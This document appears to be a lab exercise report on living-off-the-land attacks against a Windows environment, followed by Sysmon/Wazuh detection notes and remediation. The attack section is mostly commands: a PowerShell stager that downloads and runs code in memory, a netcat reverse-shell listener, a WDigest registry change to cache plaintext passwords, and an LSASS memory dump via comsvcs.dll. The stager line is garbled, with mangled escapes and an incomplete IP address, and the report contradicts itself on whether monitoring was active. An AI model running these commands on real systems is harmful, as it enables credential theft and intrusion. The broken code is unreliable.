# Lab 7: Living-Off-The-Land (LotL) & Steganography Execution Report

## 1. Executive Summary
This exercise demonstrates Living-Off-the-Land (LotL) post-exploitation and defense evasion techniques within a Windows Enterprise testing environment. The operations successfully combined custom image steganography with memory-only (fileless) loaders to completely bypass traditional static disk-scanning defensive controls. An interactive command shell was established via a native network socket, culminating in localized credential harvesting actions via built-in system administration utilities.

---

## 2. Red Team Phase: Tactical Execution Log


| Attack ID | Native Tool Component | Action Type | Implementation Notes |
| :--- | :--- | :--- | :--- |
| **LID001** | PowerShell / Netcat | Fileless Execution | Evaded standard disk antivirus scanning by compiling and executing a reverse-shell socket stream strictly in memory. |
| **LID002** | WMI / WMIC / Comsvcs | Credential Harvest | Extracted a forensic memory structure copy of the security subsystem (`lsass.exe`) using exclusively trusted Windows binaries. |

---

## 3. Step-by-Step Technical Implementation

### 3.1 Steganographic Payload Assembly & Staging
To minimize on-disk anomalies on the victim node, the malicious payload configuration script block was hidden inside a completely valid graphic asset (`.jpg`).

1. **Binary Concatenation Syntax:**
   The text payload command block was appended directly behind the natural End-of-File marker bytes of a legitimate image:
   ```bash
   cat input.jpg payload.txt > target.jpg
   ```
2. **Attacker Staging Infrastructure:**
   The compiled asset was hosted on an automated Python web instance over an alternative port to prevent socket binding collisions with existing reverse-proxy listeners:
   ```bash
   python3 -m http.server 8080
   ```

### 3.2 Memory-Only Payload Delivery
Because web browsers only render pixel fields and explicitly drop trailing data layers, execution was completed using a native Living-Off-the-Land network stager. The loader downloaded the image string into memory, isolated the code bytes, and executed them without saving a file to the hard drive:

```powershell
powershell.exe -nop -w hidden -c "\$img=[System.Text.Encoding]::ASCII.GetString((Invoke-WebRequest -Uri '192.168.1' -UseBasicParsing).Content);\(start=\)img.IndexOf('New-Object');\(payload=\)img.Substring(\(start);IEX\)payload"
```

### 3.3 Active Credential Harvesting Sequence
Once the fileless stager completed a reverse network connection back to the attacker's active listener terminal (`nc -lvnp 4444`), the following operations were run through the interactive command console:

1. **Forced Plaintext Authentication Caching:**
   ```cmd
   reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
   ```
2. **Native WMI Memory Process Extraction:**
   Leveraged the native administrative utility `wmic` alongside a trusted built-in library (`comsvcs.dll`) to trigger a silent minidump of the Local Security Authority Subsystem Service to a temporary cache file:
   ```cmd
   wmic process call create "cmd.exe /c rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump (get-process lsass).id C:\Windows\Temp\lsass.dmp full"
   ```

---

## 4. Blue Team Phase: Detection Engineering Analytics

### 4.1 Telemetry Gaps & Anomaly Vector Analysis
*   **Static Scanning Failure:** Standard antivirus file-system monitors failed to flag `target.jpg` upon entry because the header structures matched a completely benign file signature (`FF D8 FF`).
*   **Endpoint Log Mapping:** The activity was successfully captured by leveraging **Microsoft Sysmon Event Logs** routed through the centralized SIEM platform.

### 4.2 Wazuh Correlation Matrix
Had the SIEM data collection loops been active on the target node, the monitoring rules would map the following event telemetry:

*   **Sysmon Event ID 1 (Process Creation):** Caught anomalous command-line parameters associated with `powershell.exe` execution blocks invoking raw memory strings (`[System.Text.Encoding]::ASCII.GetString`).
*   **Sysmon Event ID 10 (Process Access):** Instantly generated a high-severity alert tracking unauthorized handle requests to `lsass.exe` initiated by an untrusted native binary (`rundll32.exe` invoking `comsvcs.dll`).

---

## 5. Conclusion & Strategic Remediation
1. **Enforce Script Execution Restrictions:** Restrict unauthorized script interpretation by enabling PowerShell Constrained Language Mode via AppLocker policies.
2. **Credential Guard Isolation:** Deploy Windows Defender Credential Guard to encrypt LSASS secrets and prevent unauthorized process dumps.
3. **Behavioral Monitoring Rules:** Configure Wazuh alerting hooks to flag any internal processes referencing `comsvcs.dll` alongside the `MiniDump` function parameter.
